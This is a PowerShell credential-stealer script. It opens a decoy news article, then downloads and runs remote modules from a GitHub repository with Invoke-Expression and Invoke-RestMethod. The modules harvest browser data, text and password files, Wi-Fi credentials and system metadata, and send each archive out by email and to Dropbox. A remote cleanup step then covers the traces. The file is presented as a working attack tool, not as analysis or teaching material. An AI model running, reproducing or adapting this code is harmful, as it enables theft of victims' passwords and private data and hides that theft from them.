param (
    [Parameter()]
    [String]$email_username,
    [String]$email_password,
    [string]$dropbox_token
)

# Admin powershell
# Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Start-Process https://www.globes.co.il/news/article.aspx?did=1001425931

Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/prepare_work_folder.ps1) }"

$filename_prefix = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_"
$browser_data_filename = "$filename_prefix$("browser_data.zip")"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_browsers_data.ps1) } $browser_data_filename"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\$browser_data_filename"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\$browser_data_filename $dropbox_token"

$pss_data_filename = "$filename_prefix$("pss_data.zip")"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_text_and_password_files.ps1) } $pss_data_filename"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\$pss_data_filename"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\$pss_data_filename $dropbox_token"

$wifi_creds_filename = "$filename_prefix$("wifi_creds.zip")"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_wifi_creds.ps1) } $wifi_creds_filename"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\$wifi_creds_filename"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\$wifi_creds_filename $dropbox_token"

$meta_info_filename = "$filename_prefix$("meta_info.zip")"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/grab_meta_information.ps1) } $meta_info_filename"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1) } $email_username $email_password $env:appdata\Microsoft\dump\$meta_info_filename"
Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_dropbox.ps1) } $env:appdata\Microsoft\dump\$meta_info_filename $dropbox_token"

Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/cleanup.ps1) }"